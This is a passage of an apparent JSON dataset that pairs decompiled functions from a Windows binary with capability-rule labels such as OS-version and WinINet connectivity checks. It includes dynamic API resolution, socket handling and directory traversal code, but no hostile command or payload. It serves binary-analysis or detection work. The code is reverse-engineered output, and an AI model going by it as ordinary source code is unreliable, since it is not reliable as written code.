        "decompiled_code": "\nbool fcn.0045d534(void)\n\n{\n    return *0x49aca0 != '\\0';\n}\n",
        "token_count": 25
    },
    "0045d5b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d5b0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.004085dc(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 108
    },
    "0045d620": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d620(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.0045d564();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.0045d580();\n            return;\n        }\n        fcn.0045d5b0();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 243
    },
    "0045d684": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d684(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x495d2c + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x45d6a2;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x45d7ea;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x49acb8 == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x45d7f8);\n            *0x49acb8 = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x45d800);\n        }\n        if (*0x49377c == 0) {\n            *0x49377c = sub.kernel32.dll_LoadLibraryA(0x45d810);\n            if (*0x49377c != 0) {\n                *0x49acbc = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d81c);\n                *0x49acc0 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d82c);\n                *0x49acc4 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d840);\n                *0x49acc8 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d858);\n                *0x49accc = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d870);\n                *0x49acd0 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d884);\n                *0x49acd4 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d89c);\n                *0x49acd8 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d8b4);\n                *0x49acdc = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d8d0);\n                *0x49ace0 = sub.kernel32.dll_GetProcAddress_1(*0x49377c, 0x45d8dc);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x45d7f1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 656
    },
    "0045d8ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d8ec(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49acb8 != NULL) {\n        uVar1 = (**0x49acb8)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 58
    },
    "0045d908": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d908(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x495d2c + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x45d937;\n            fcn.0045d8ec();\n        }\n        else {\n            uStack24 = 0x45d945;\n            fcn.0045d8ec();\n            if (*0x49377c != 0) {\n                puStack28 = 0x45d959;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x49acbc)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x45d970;\n                    uStack36 = uVar1;\n                    (**0x49acc4)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x49accc)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x49accc)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x49accc)();\n                        (**0x49acc4)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x49377c);\n                    }\n                    (**0x49acc8)(uVar1, uStack44, uStack40);\n                    (**0x49acc0)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "0045d9e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d9e0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49377c != 0) {\n        uVar1 = (**0x49acdc)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 60
    },
    "0045d9f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d9f4(void)\n\n{\n    fcn.00404650();\n    **0x495b10 = 0;\n    fcn.00404650();\n    **0x495d00 = 0;\n    fcn.00404650();\n    *0x49ac5c = 0;\n    fcn.00404650();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x49ac72);\n    fcn.00405530();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x49ac70);\n    fcn.00405530();\n    if (*0x49377c != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x49377c);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0045dd60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045dd60(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 4);\n    if (iVar2 != 0) {\n        if (arg_8h != '\\0') {\n            *(iVar2 + 0x164) = 1;\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) | 0x4000;\n        }\n        uStack28 = 0x45de3b;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        cVar3 = fcn.00453390();\n        if ((cVar3 == '\\0') || (*(*(in_EAX + 4) + 0x30) == 0)) {\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h);\n        }\n        else {\n            arg_ch = arg_ch - (*(in_EAX + 0xc) + *(in_EAX + 0x14));\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h - (*(in_EAX + 8) + *(in_EAX + 0x10)));\n        }\n        *in_FS_OFFSET = arg_ch;\n        if (arg_8h != '\\0') {\n            iVar2 = *(in_EAX + 4);\n            *(iVar2 + 0x164) = 0;\n            puVar1 = iVar2 + 0x54;\n            *puVar1 = *puVar1 & 0xbfff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "0045e4d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e4d4(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45e662;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00406928(arg_1ch[2]);\n    iVar1 = fcn.00406774();\n    if (arg_1ch[3] < 1) {\n        if (-1 < iVar1) {\n            iVar2 = iVar1 + 1;\n            do {\n                fcn.00411a70();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else if (-1 < iVar1) {\n        iVar2 = iVar1 + 1;\n        do {\n            fcn.00411a70();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (*(arg_8h + 4) != NULL) {\n        (**(**(arg_8h + 4) + 0x38))();\n    }\n    if (arg_1ch[3] < 1) {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a70();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    else {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.00411a70();\n                }\n                iVar2 = iVar2 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    fcn.00406928(0);\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45e669;\n    uStack40 = 0x45e661;\n    fcn.00406934();\n    return;\n}\n",
        "token_count": 637
    },
    "0045e8a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.0045e8a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x44) != 0) {\n        return 3;\n    }\n    return *(in_EAX + 0x48);\n}\n",
        "token_count": 60
    },
    "0045f580": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f580(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack244;\n    uint uStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    int32_t iStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint var_78h;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint var_68h;\n    uint lpBaseAddress;\n    uint hFileMappingObject;\n    uint hObject;\n    uint var_4h;\n    \n    uStack140 = 0x45f595;\n    cVar1 = fcn.0040a274();\n    if (cVar1 != '\\0') {\n        uStack140 = 0x45f5a5;\n        fcn.0045eacc();\n        uStack140 = 0;\n        uStack144 = 0x8000080;\n        uStack148 = 3;\n        uStack152 = 0;\n        uStack156 = 3;\n        uStack160 = 0x80000000;\n        uStack164 = 0x45f5be;\n        uStack164 = fcn.004059dc();\n        puStack168 = 0x45f5c4;\n        iVar2 = sub.kernel32.dll_CreateFileA_1();\n        if (iVar2 != -1) {\n            uStack172 = 0x45f6a0;\n            iStack176 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff50;\n            uStack180 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            uStack192 = 2;\n            iStack196 = 0;\n            puStack204 = 0x45f5f2;\n            iStack200 = iVar2;\n            puStack168 = &stack0xfffffffc;\n            iVar3 = sub.kernel32.dll_CreateFileMappingA();\n            if (iVar3 == 0) {\n                *in_FS_OFFSET = iStack200;\n                uStack192 = 0x45f6a7;\n                iStack200 = 0x45f69f;\n                iStack196 = iVar2;\n                sub.kernel32.dll_CloseHandle_1();\n                return;\n            }\n            uStack208 = 0x45f682;\n            iStack212 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff2c;\n            uStack216 = 0;\n            uStack220 = 0;\n            uStack224 = 0;\n            iStack228 = 4;\n            puStack236 = 0x45f61e;\n            iStack232 = iVar3;\n            puStack204 = &stack0xfffffffc;\n            iVar4 = sub.kernel32.dll_MapViewOfFile();\n            if (iVar4 != 0) {\n                uStack240 = 0x45f664;\n                iStack244 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff0c;\n                puStack236 = &stack0xfffffffc;\n                sub.kernel32.dll_GetFileSize_1(iVar2, 0);\n                fcn.0045eaf0();\n                *in_FS_OFFSET = iVar2;\n                iStack244 = 0x45f66b;\n                sub.kernel32.dll_UnmapViewOfFile(iVar4);\n                return;\n            }\n            *in_FS_OFFSET = iStack232;\n            uStack224 = 0x45f689;\n            iStack232 = 0x45f681;\n            iStack228 = iVar3;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        puStack168 = 0x45f6b2;\n        fcn.0045eb84();\n        *param_2 = var_78h;\n        param_2[1] = uStack120;\n        param_2[2] = uStack116;\n        param_2[3] = uStack112;\n    }\n    return;\n}\n",
        "token_count": 1031
    },
    "0045fbe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045fbe4(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45fc75;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49acfc = *0x49acfc + 1;\n    if (*0x49acfc == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4938d4 != 0) {\n            fcn.00404650();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4938d8 != 0) {\n            fcn.00404650();\n        }\n        if (*0x4938dc != 0) {\n            fcn.00404650();\n        }\n        if (*0x4938e0 != 0) {\n            fcn.00404650();\n        }\n        if (*0x4938e4 != 0) {\n            fcn.00404650();\n        }\n        uStack20 = *0x49acf8;\n        sub.gdiplus.dll_GdiplusShutdown();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 314
    },
    "0045fc80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045fccc)\n// WARNING: Removing unreachable block (ram,0x0045fcda)\n// WARNING: Removing unreachable block (ram,0x0045fcf2)\n// WARNING: Removing unreachable block (ram,0x0045fd0e)\n// WARNING: Removing unreachable block (ram,0x0045fd24)\n// WARNING: Removing unreachable block (ram,0x0045fd28)\n\nvoid fcn.0045fc80(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x45fc9c;\n    fcn.004059cc();\n    uStack48 = 0x45fd50;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0045f974();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x45fd57;\n    uStack48 = 0x45fd47;\n    fcn.00405530();\n    uStack48 = 0x45fd4f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 319
    },
    "004603d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004603d4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    if (*(in_EAX + 0xc) == '\\0') {\n        uStack16 = *(in_EAX + 0x3e);\n        uStack20 = *(*(in_EAX + 0x11) * 4 + 0x493948);\n        uStack24 = *(*(in_EAX + 0xf) * 4 + 0x4938e8);\n        sub.wsock32.dll_socket();\n        iVar1 = (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = iVar1;\n        *(in_EAX + 0xc) = iVar1 != -1;\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x31) == '\\x01') {\n                uStack24 = 1;\n                sub.wsock32.dll_ioctlsocket(in_EAX[0x10], 0x8004667e, &uStack24);\n                (**(*in_EAX + 0x38))();\n            }\n            in_EAX[0xd] = 0;\n            in_EAX[0xe] = 0;\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "00460458": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00460458(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(in_EAX + 0xc) != '\\0') {\n        sub.wsock32.dll_closesocket(in_EAX[0x10]);\n        (**(*in_EAX + 0x38))();\n        in_EAX[0x10] = -1;\n        *(in_EAX + 0xc) = 0;\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00460a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00460a48(void)\n\n{\n    if (*0x49ae94 == 0) {\n        *0x49ae94 = sub.kernel32.dll_GetModuleHandleA_2(0x460ba4);\n        if (*0x49ae94 != 0) {\n            *0x49ae98 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460bb4);\n            *0x49ae9c = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460bd0);\n            *0x49aea0 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460be0);\n            *0x49aea4 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460bf0);\n            *0x49aea8 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460bfc);\n            *0x49aeac = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c08);\n            *0x49aeb0 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c24);\n            *0x49aeb4 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c34);\n            *0x49aeb8 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c44);\n            *0x49aebc = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c54);\n            *0x49aec0 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c64);\n            *0x49aec4 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c74);\n            *0x49aec8 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c84);\n            *0x49aecc = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460c94);\n            *0x49aed0 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460ca4);\n            *0x49aed4 = sub.kernel32.dll_GetProcAddress_1(*0x49ae94, 0x460cb4);\n        }\n    }\n    if ((*0x49ae94 != 0) && (*0x49ae98 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 589
    },
    "00460d64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00460d64(void)\n\n{\n    if (*0x49aed8 == 0) {\n        *0x49aed8 = sub.kernel32.dll_LoadLibraryA(0x460f30);\n        if (*0x49aed8 < 0x20) {\n            *0x49aed8 = 0;\n            return 0;\n        }\n        *0x49aedc = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f3c);\n        *0x49aee0 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f4c);\n        *0x49aee4 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f60);\n        *0x49aee8 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f74);\n        *0x49aeec = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f60);\n        *0x49aef0 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f74);\n        *0x49aef4 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460f8c);\n        *0x49aef8 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460fa0);\n        *0x49aefc = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460fb8);\n        *0x49af00 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460fd0);\n        *0x49af04 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460fe0);\n        *0x49af08 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x460ff0);\n        *0x49af0c = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x46100c);\n        *0x49af10 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x461020);\n        *0x49af14 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x46103c);\n        *0x49af18 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x46100c);\n        *0x49af1c = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x461020);\n        *0x49af20 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x46103c);\n        *0x49af24 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x461058);\n        *0x49af28 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x46106c);\n        *0x49af2c = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x461088);\n        *0x49af30 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x4610a4);\n        *0x49af34 = sub.kernel32.dll_GetProcAddress_1(*0x49aed8, 0x4610b8);\n    }\n    return 1;\n}\n",
        "token_count": 789
    },
    "00461c98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00461c98(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    int32_t var_16ch;\n    uint var_168h;\n    uint var_158h;\n    uint var_154h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_174h = 0;\n    var_170h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    puStack384 = 0x461cd2;\n    var_16ch = in_EAX;\n    fcn.00405fe8();\n    uStack388 = 0x461ec3;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    if (*(var_16ch + 0xd) == '\\0') {\n        puStack396 = 0x461d01;\n        puStack384 = &stack0xfffffffc;\n        fcn.0040e838();\n        puStack396 = 0x461d0c;\n        fcn.004055c8();\n        puStack396 = 0x461d23;\n        fcn.00405864();\n        puStack396 = 0x461d39;\n        iVar1 = fcn.0040a490();\n        if (iVar1 == 0) {\n            uStack400 = 0x461da7;\n            uStack404 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                fcn.00405864();\n                (**(**(var_16ch + 0x4c) + 0x38))();\n                iVar1 = fcn.0040a4e0();\n                if (iVar1 != 0) break;\n            } while (*(var_16ch + 0xd) == '\\0');\n            *in_FS_OFFSET = uStack404;\n            puStack396 = 0x461dae;\n            uStack400 = 0x461da6;\n            fcn.0040a504();\n            return;\n        }\n        if (*(var_16ch + 0x48) != '\\0') {\n            puStack396 = 0x461dd1;\n            fcn.00405864();\n            puStack396 = 0x461de7;\n            iVar1 = fcn.0040a490();\n            if (iVar1 == 0) {\n                uStack400 = 0x461e80;\n                uStack404 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffe6c;\n                puStack396 = &stack0xfffffffc;\n                do {\n                    bVar2 = (var_158h & 0x10) == 0;\n                    if (!bVar2) {\n                        fcn.00405974();\n                        if (!bVar2) {\n                            fcn.00405974();\n                            if (!bVar2) {\n                                fcn.00405864();\n                                fcn.00461c98();\n                            }\n                        }\n                    }\n                    iVar1 = fcn.0040a4e0();\n                } while ((iVar1 == 0) && (*(var_16ch + 0xd) == '\\0'));\n                *in_FS_OFFSET = uStack404;\n                puStack396 = 0x461e87;\n                uStack400 = 0x461e7f;\n                fcn.0040a504();\n                return;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x461eca;\n    uStack388 = 0x461ea4;\n    fcn.00405554();\n    uStack388 = 0x461eb5;\n    fcn.004060ac();\n    uStack388 = 0x461ec2;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 941
    },
    "00462a58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
